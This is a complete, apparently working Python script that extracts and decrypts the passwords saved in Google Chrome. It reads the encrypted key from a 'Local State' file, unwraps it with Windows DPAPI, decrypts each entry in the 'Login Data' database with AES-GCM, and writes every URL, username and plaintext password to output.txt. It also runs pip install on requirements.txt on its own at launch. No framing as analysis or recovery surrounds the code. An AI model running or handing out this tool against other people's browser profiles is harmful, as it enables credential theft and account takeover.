import os
import subprocess
import sys
import colorama
from colorama import Fore, Style

# Initialize colorama
colorama.init(autoreset=True)

# Function to install packages from requirements.txt
def install_requirements():
    if not os.path.exists('requirements.txt'):
        print(f"{Fore.RED}requirements.txt not found!")
        return
    
    print(f"{Fore.YELLOW}Installing required packages...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", 'requirements.txt'])

# Install dependencies
install_requirements()

import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil

# Get the directory where this script is located
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# Define the output folder based on the script's directory
OUTPUT_FOLDER = SCRIPT_DIR
# Define paths for output files
OUTPUT_FILE_PATH = os.path.join(OUTPUT_FOLDER, 'output.txt')

def get_secret_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]  # Remove DPAPI prefix
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(f"{Fore.RED}[ERR] Chrome secret key cannot be found. Details: {e}")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        return decrypted_pass.decode()
    except Exception as e:
        print(f"{Fore.RED}[ERR] Unable to decrypt password. Details: {e}")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(f"{Fore.RED}[ERR] Chrome database cannot be found. Details: {e}")
        return None

if __name__ == '__main__':
    user_folder = input(f"{Fore.GREEN}Enter the folder path where 'Local State' and 'Login Data' files are located: ").strip()
    
    local_state_path = os.path.join(user_folder, 'Local State')
    login_data_path = os.path.join(user_folder, 'Login Data')

    with open(OUTPUT_FILE_PATH, 'w', encoding='utf-8') as output_file:
        sys.stdout = output_file  # Redirect standard output to file

        try:
            secret_key = get_secret_key(local_state_path)
            if secret_key:
                conn = get_db_connection(login_data_path)
                if conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            print(f"{Fore.CYAN}Sequence: {index}")
                            print(f"URL: {Fore.YELLOW}{url}\nUser Name: {Fore.GREEN}{username}\nPassword: {Fore.MAGENTA}{decrypted_password}")
                            print(f"{Fore.WHITE}{'*' * 50}")
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
        except Exception as e:
            print(f"{Fore.RED}[ERR] {e}")
